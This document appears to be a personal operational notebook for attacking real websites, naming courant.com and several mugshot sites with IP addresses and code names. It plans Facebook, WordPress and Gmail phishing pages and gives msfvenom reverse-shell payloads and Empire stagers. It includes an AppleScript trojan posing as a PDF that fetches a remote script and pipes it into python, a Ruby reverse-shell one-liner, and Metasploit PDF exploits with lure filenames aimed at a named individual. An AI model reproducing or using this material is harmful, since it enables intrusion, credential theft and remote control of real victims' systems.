# Metasploit

`/opt/metasploit-framework/bin/msfconsole`

# Targets

courant.com - http://54.218.214.241
budstedmugshots.com - https://104.31.1.164

## TODO

- Build Phish Sites + Setup server 
	- Facebook Login Phish
	- WP Login Phish + Custom Business WP Login
	- Craigslist Item w/ Back-Button and an Email-Seller to Gmail Login Phish
	- Maltego Install (Downloaded)


# 4) Exfiltration

Grab All Imprtant Target Data - https://null-byte.wonderhowto.com/how-to/securely-sync-files-between-two-machines-using-syncthing-0185999/


# 3) Payloads

### msfvenmom

Exploit with PHP, then use PHP Exploit to upload Linux Backdoor, and connect through that (more stable)

```bash
msfvenom -l payloads
msfvenom -p php/meterpreter/bind_tcp --payload-options 
exploit # Starts the Handler

# Generate Linux
msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=5000 > /root/msf/linux_backdoor 

# In PHP Back Door Handler
upload /root/msf/linux_backdoor /tmp
background # Switch PHP-Payload Session in background
sessions # View Sessions in background

set payload linux/x86/meterpreter/bind_tcp
set LPORT 5000
exploit -j # Reconfigure the new Linux handler to run in the background with -j

# Switch back to PHP session, to start the Linux Backdoor on remote system
session -i 2
execute -f /tmp/linux_backdoor
# Opens up new stable mterpreter shell

```

### Payloads by OS + Server

```bash
# OSX
msfvenom -p osx/x86/shell_reverse_tcp LHOST=[Your IP] LPORT=[Your Port] -f macho > shell.macho

# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=[Your Port] -f exe > shell.exe

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=[Your Port] -f elf > shell.elf

# PHP
 -p php/meterpreter_reverse_tcp LHOST=[Your IP] LPORT=[Your Port] -f raw > shell.php
cat shell.php | xclip -selection clipboard && echo "<?php " > shell.php && xclip -selection clipboard -o >> shell.php && echo && echo " ?>" >> shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=[Your Port] -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your IP] LPORT=[Your Port] -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your IP] LPORT=[Your Port] -f war > shell.war
```

## Tools

### Empire

Run Empire Interactive `./empire`

#### Listeners

```bash
listeners # Displays active listeners

# Enable standard HTTP Listener. 
# Enters Listener interactive console
uselistener http 

info # View listener options
set Port 80
set Host 0.0.0.0
execute # Starts listener
listeners # Lists Listeners

```

#### Stagers

`stagers` similar to `payloads`, are used to create a connection back to Empire listener, when opened by victim

```bash
usestager # <Press Tab> - Displays availabl Stagers
usestager osx/applescript
info # displays selected stager info
set Listener http # Name the listener
generate # Displays the Stager code. 
# Copy the generated Python Code.

# SSH into an anon VPS Server
mkdir artemis
pbpaste > script # Paste Listener Python Code
python3 -m http.server 8080 &

```

### Create a PDF Graphics

1. Download the cover of a book from the internet
2. `gimp cover.jpg`
3. File > Export As > Name: 'real.pdf' Type: 'Portable Document Format (*.pdf)'
4. Image > Canvas Size > Change `width` to match `height` > Resize
5. Tools > Transform Tools > `Align` > Click the Image
6. Image > Scale Image > `Width: 256px` `Height: 256px`
7. File > Export As > `Name: cover.png` `Format: PNG Image (*.png)`
8. Convert to `Apple Icon (.icns)` format using [CloudConvert Took](https://cloudconvert.com/png-to-icns)
9. Save files in the project folder: 
	- `cover.icns` - Apple Icon File  
	- `real.pdf` - Small PDF downloaded by target every-time Applescript (Fake PDF) opened
	- `cover.jpg` + `cover.png` - templates not needed further 

### Build Trojan

- Copy PDF, make a backup copy
- Create Applescript (Script Editor app)

```applescript
do shell script "s=ATTACKER-IP-ADDRESS:PORT; curl -s $s/real.pdf | open -f -a Preview.app & curl -s $s/script | python -"
```

- 

## Target Codes

- `artemis` - Hartford Courant
- `medussa` - mugshot-websites:
	1. `scylla` - bustedmugshots.com
	2. `hades` - mugshots.com
	3. `chaos` - bookingbytes.com
	4. `hedone` - last-mugshot-website

## Attacks

### Ruby Backdoor - MacOSX

```bash
# Start Netcat Listener on C&C Server, Waitfor Payload to Connect
nc -v -l -p 9999

# Execute Backdoor on Target
# Set the CC IP and Port
ruby -rsocket -e "c=TCPSocket.new('1.2.3.4','9999');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"

```

### PDF Exploit - MacOSX

Create exploit and payload using Empire

```bash
./empire
listeners
```

### PDF Exploit - Windows
```bash
search type:exploit platform:windows adobe pdf

use exploit/windows/fileformat/adobe_pdf_embedded_exe

exploit (adobe_pdf_embedded_exe) > info

exploit (adobe_pdf_embedded_exe) > set payload
windows/meterpreter/reverse_tcp

exploit (adobe_pdf_embedded_exe) > show options

exploit (adobe_pdf_embedded_exe) > set INFILENAME dan_m_evidence_SECRET.pdf
exploit (adobe_pdf_embedded_exe) > set FILENAME dan_m_evidence_SECRET.pdf
exploit (adobe_pdf_embedded_exe) > set LHOST 192.168.1.149
exploit (adobe_pdf_embedded_exe) > exploit
```

### PDF Exploit 2 - Windows

```bash
use exploit/windows/fileformat/adobe_utilprintf
set FILENAME DanMalloy-AbuseEvidencePoliceReport.pdf
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.8.128
set LPORT 4455
show options
```

### iSight Exploit - MacOSX
```bash
msfvenom -a x86 --platform OSX -p osx/x86/isight/bind_tcp -b "\x00" -f elf -o /tmp/osxt2
```


### Payloads
```bash
payload/osx/x64/meterpreter_reverse_tcp
payload/osx/x86/isight/reverse_tcp
windows/meterpreter/reverse_tcp
```
